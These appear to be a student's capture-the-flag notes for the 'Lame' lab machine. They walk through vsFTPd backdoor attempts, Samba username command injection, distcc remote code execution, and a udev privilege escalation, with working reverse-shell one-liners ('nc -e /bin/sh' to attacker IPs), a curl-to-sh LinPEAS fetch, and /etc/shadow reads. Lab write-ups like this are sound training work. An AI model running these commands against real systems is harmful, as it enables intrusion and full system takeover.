
## FTP vsFTPd 2.3.4
#ftp
1. Method 1
	**T1592.002 Gather Victim Host Information** 
	
	Run: 
	
	`ftp 10.10.10.3
	![[Pasted image 20230225080026.png]]
	
	`searchsploit vsftpd
	![[Pasted image 20230225080134.png]]
	
	Exploit for vsFTPd 2.3.4:
		vsftpd 2.3.4 - Backdoor Command Execution                                | unix/remote/49757.py
		vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)            | unix/remote/17491.rb
	
	
	Read and check exploit:
	`searchsploit -x 17491`
	![[Pasted image 20230225081117.png]]
	Ref: 
	http://pastebin.com/AetT9sS5'],
	'http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html'

	ftp 10.10.10.3 21 
	username: testers:)
	password: testers
	//on separate pane open nc to 10.10.10.3 6200
	nc 10.10.10.3 6200
	id
	//failed;nothing happening
	
	**Result: does not work as of the moment (may resume later)**



---
## SMB / Samba
#smb 
1. Method 1 - Try Again
	sudo smbclient --no-pass --user='/=`nohup nc -e /bin/sh 10.10.16.2 443`' //10.10.10.3/tmp
	![[Pasted image 20230226182328.png]]
	Result: SMB Method does not work at the moment

2. Method 2 - Success 
	//open smbclient
	sudo smbclient --no-pass //10.10.10.3/tmp
	
	// start a reverse shell to you kali over port 443 from smblicent //10.10.10.3/tmp
	logon "/=`nohup nc -e /bin/sh 10.10.16.2 443`" //10.10.10.3/tmp    
	
	// in parallel, open another pane and start a listener 
	nc -nvlp 443
	
	// test using 'id' to indicate root ID; it is working
	id 
	whoami
	which nc
	which python
	![[Pasted image 20230226182435.png]]
	**Result SMB Method 2: it works**

3. Additional Exploit: Privilege Escalation - It works
	//import pwn
	python -c 'import pty;pty.spawn("/bin/bash")'
	
	
	//check for blocks in firewall iptables
	iptables -L
	//find the flags user.txt and root.txt
	`find / -iname user.txt -exec wc {} \;`
	`find /  -iname root user.txt -exec wc {} \;`
	![[Pasted image 20230226184046.png]]
	![[Pasted image 20230226191208.png]]
	ls
	cd root
	cat root.txt 
	Success > get hash/flag: 9055020c419f7cb47bcac12a71f83a19


## Resume FTP vsFTPd 2.3.4 exploit(figure out) 
#ftp 
<u>This is done after getting root via samba exploit </u>
1. Retry
	Figure out wht ftp exploit not working > block? 
	//Find out which user has bash !!! 
	cat /etc/shadow | grep bash
	cat /etc/shadow | grep sh
	 //no results and cat of /etc/shadows only shows hash values
	![[Pasted image 20230226185052.png]]
	
	//check port 6200
	netstat -pantl | grep 6200
	// try fo find account that have a shell
	cat /etc/passwd | grep bash 
	![[Pasted image 20230226191649.png]]
	cat /etc/passwd | grep sh
	![[Pasted image 20230226191820.png]]
	//user makis has a shell
	//try user makis to start shell
	su - makis -c bash
	whoami
	![[Pasted image 20230226185223.png]]
	
	//go back to ftp pane and rerun exploit
	ftp 10.10.10.3
	user: testers:)
	password: testers  
	//in smb pane using makis user, open/connect nc local host port 6200
	nc 127.0.0.1 6200    //why port 6200?
	//check if makis user was escalated to root using ID
	id
	 ![[Pasted image 20230226192608.png]]
	 //check logs for blocking port 6200
	 cat /var/log messages.0 | grep 6200
	 ![[Pasted image 20230226213433.png]]
	 **Result of ftp exploit: user makis was escalated to root **

---
## ## OpenSSH 4.7p1 Debian 8ubuntu1
#openssh 

1. Method 1: distcc
	//checkdistcc
	searchsploit distcc
	![[Pasted image 20230226213559.png]]
	CVE', '2004-2687
	http://distcc.samba.org/security.html
	![[Pasted image 20230226213840.png]]
	![[Pasted image 20230226213913.png]]
	find /usr/share/nmap/scripts/*dist* -type f 2>/dev/null
	cat /usr/share/nmap/scripts/distcc-cve2004-2687.nse
	![[Pasted image 20230226215641.png]]
	// need to change the name of the script to match the usage format
	sudo mv /usr/share/nmap/scripts/distcc-cve2004-2687.nse /usr/share/nmap/scripts/distcc-exec.nse
	sudo nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='id'"
	//Executing 'id' command from nmap distcc RCE


## Upgrade to shell access from nmap distcc
T1404: Exploit OS Vulnerability
T1588.005: Resource Development

// Find if netcat is available 
sudo nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='which nc'"
![[Pasted image 20230304172853.png]]
yes, nc is available

// Try to do a reverse shell 
create a separate session and listen on port 443
sudo nc -nvlp 443

on separate session, create a reverse shell
sudo nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='nc -e /bin/sh 10.10.16.4 443'"
![[Pasted image 20230304173415.png]]

//upgrade the shell
python -c 'import pty;pty.spawn("/bin/bash")'
![[Pasted image 20230304173540.png]]

// suspend the process: ctrl-z

//set terminal to  raw" mode - means what is sent should be exactly what is received. 
stty raw -echo

//foreground the process
fg

// determine version of operating system
lsb_release -a
![[Pasted image 20230304174031.png]]

uname -a
![[Pasted image 20230304174202.png]]

//check ubuntu 2.6  in searchsploit, find privilege excalation options
searchsploit 2.6 ubuntu 8 
![[Pasted image 20230304174641.png]]

// inspect vulnerability
searchsploit -x 8572

//check how to use vuln
![[Pasted image 20230304174904.png]]

//verify if udevd is running on the reverse shell
ps -aux | grep dev

![[Pasted image 20230304175039.png]]
udevd is running as root
the PID of the udevd is 2742

// check the PID of /proc/net/netlink socket ( usually PID of udevd minus 1)
cat /proc/net/netlink
![[Pasted image 20230304180042.png]]
PID of socket is 2741

// mirror/copy this exploit 
sudo searchsploit -m 8572.c
![[Pasted image 20230304180315.png]]

// enable server in port 80 to then be copied to the victim machine
sudo python3 -m http.server 80
![[Pasted image 20230304180502.png]]

// go to reverse shell, and transfer exploit to lame machine/victim machine
//check if wget is available
which wget
![[Pasted image 20230304180656.png]]

// transfer 8572.c
![[Pasted image 20230304181346.png]]

//check for gnu compiler if available
![[Pasted image 20230304181455.png]]

// compile the exploit using gcc
gcc 8572.c -o 8572

![[Pasted image 20230304181604.png]]

//create the run file 
echo '#!/bin/bash' > run 
echo 'nc -nv 10.10.16.4 9001 -e /bin/bash' >> run 
![[Pasted image 20230304182100.png]]

//open another session and listen to port 9001
nc -nvlp 9001

//on the reverse shell, run the exploit and pass the PID of the socket as argument 
./8572 2741

![[Pasted image 20230304182342.png]]
the exploit does not work 
the file may have been corrupted


//Try something else: tar transfer

//check if tar is available
which tar
![[Pasted image 20230304182535.png]]

//on lame victim machine, setup a nc listener on 9001 and pipe to tar
nc -nvlp 9001 | tar -xf -

// on a different session, compress the export using tar
tar -cf - 8572.c  | nc -nv 10.10.10.3 9001
there is no status message

// on revershell and you other session do md5sum to check hash of exploit is the same 
![[Pasted image 20230304183638.png]]

//recompile the exploit
gcc 8572.c -o 8572
//check compile time if right
![[Pasted image 20230304183916.png]]

//try rewrite the run file 
echo '#!/bin/bash' > run                 // rewrite
echo 'nc -e /bin/bash 10.10.16.4 9001'>> run 

//try to run the expliot again
./8572 2741

// still nothing happens
![[Pasted image 20230304184632.png]]



## LinPEAS (Linux Privilege excalation awesome script)
//try another approach 
T1083: Discovery: file and directory discovery
Link: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

//
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh





Next: [[4_Lame_Reporting]]